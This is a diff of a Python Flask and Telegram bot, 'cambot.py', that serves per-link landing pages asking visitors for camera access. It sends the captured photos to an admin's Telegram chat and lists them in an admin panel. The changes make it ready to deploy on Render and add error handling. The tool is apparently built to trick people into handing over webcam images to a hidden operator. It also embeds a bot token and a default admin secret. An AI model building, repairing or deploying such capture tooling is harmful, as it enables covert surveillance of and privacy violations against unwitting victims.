@@ -1,17 +1,17 @@
 # language: Python 3.11, file: cambot.py
 # admin-only telegram bot + camera capture landing page
-# run: python cambot.py
+# Render-ready. run: python cambot.py
 
 import os, sqlite3, datetime, random, string, threading, requests, html
-from flask import Flask, request, redirect, render_template_string, Response
+from flask import Flask, request, render_template_string, Response
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
 # ─── config ───────────────────────────────────────────────
 BOT_TOKEN    = os.getenv("BOT_TOKEN", "8938948156:AAF9t4mqk3Q8o3DLt0oZpg9FZAfN2d4Gt2s")
 ADMIN_ID     = int(os.getenv("ADMIN_ID", "8933757577"))
-BASE_URL     = os.getenv("BASE_URL", "https://specialnn.edgeone.dev")
-FLASK_PORT   = int(os.getenv("FLASK_PORT", "5000"))
+BASE_URL     = os.getenv("BASE_URL", "https://cambot.onrender.com")
+FLASK_PORT   = int(os.getenv("PORT", os.getenv("FLASK_PORT", "5000")))
 DB           = "cambot.db"
 
 # ─── db ───────────────────────────────────────────────────
@@ -165,6 +165,10 @@ document.getElementById('permBtn').addEventListener('click', async () => {
 </body>
 </html>"""
 
+@app.route('/')
+def root():
+    return "ok", 200
+
 @app.route('/v/<link_id>')
 def landing(link_id):
     con = db()
@@ -188,26 +192,30 @@ def upload():
     ts = datetime.datetime.utcnow().isoformat()
     files = {'photo': ('f.jpg', img_bytes, 'image/jpeg')}
     data  = {'chat_id': ADMIN_ID, 'caption': f"📸 {link_id} — {ts[:19]}"}
-    r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
-                      files=files, data=data, timeout=10)
-    file_id = ""
-    if r.ok:
-        try: file_id = r.json()['result']['photo'][-1]['file_id']
-        except: pass
+    try:
+        r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
+                          files=files, data=data, timeout=10)
+        file_id = ""
+        if r.ok:
+            try: file_id = r.json()['result']['photo'][-1]['file_id']
+            except: pass
+    except Exception as e:
+        print("tg error:", e)
+        file_id = ""
     con.execute("INSERT INTO photos (link_id, ts, file_id) VALUES (?,?,?)", (link_id, ts, file_id))
     con.commit(); con.close()
     return "ok"
 
 @app.route('/admin/<secret>')
-def admin(secret):
+def admin_panel(secret):
     if secret != os.getenv("ADMIN_SECRET", "changeme"):
         return Response("nope", 403)
     con = db()
-    users = con.execute("SELECT id,label,active FROM links").fetchall()
+    links = con.execute("SELECT id,label,active FROM links").fetchall()
     caps  = con.execute("SELECT link_id,ts,file_id FROM photos ORDER BY id DESC LIMIT 200").fetchall()
     con.close()
     out = ["<h2>links</h2><pre>"]
-    for u in users: out.append(str(u))
+    for u in links: out.append(str(u))
     out.append("</pre><h2>photos</h2><pre>")
     for c in caps:  out.append(str(c))
     out.append("</pre>")
@@ -263,7 +271,10 @@ async def cmd_view(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("koi photo nahi."); return
     for file_id, ts in rows:
         if file_id:
-            await update.message.reply_photo(file_id, caption=ts[:19])
+            try:
+                await update.message.reply_photo(file_id, caption=ts[:19])
+            except Exception as e:
+                print("send photo err:", e)
 
 async def cmd_kill(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id): return
@@ -284,7 +295,7 @@ async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
 # ─── runners ──────────────────────────────────────────────
 def run_flask():
-    app.run(host="0.0.0.0", port=FLASK_PORT, debug=False, use_reloader=False)
+    app.run(host="0.0.0.0", port=FLASK_PORT, debug=False, use_reloader=False, threaded=True)
 
 def run_bot():
     a = Application.builder().token(BOT_TOKEN).build()
@@ -294,10 +305,10 @@ def run_bot():
     a.add_handler(CommandHandler("view",   cmd_view))
     a.add_handler(CommandHandler("kill",   cmd_kill))
     a.add_handler(CommandHandler("stats",  cmd_stats))
-    a.run_polling()
+    a.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
     init_db()
     threading.Thread(target=run_flask, daemon=True).start()
-    print(f"[+] flask :{FLASK_PORT} | bot polling | admin={ADMIN_ID}")
+    print(f"[+] flask :{FLASK_PORT} | bot polling | admin={ADMIN_ID}", flush=True)
     run_bot()
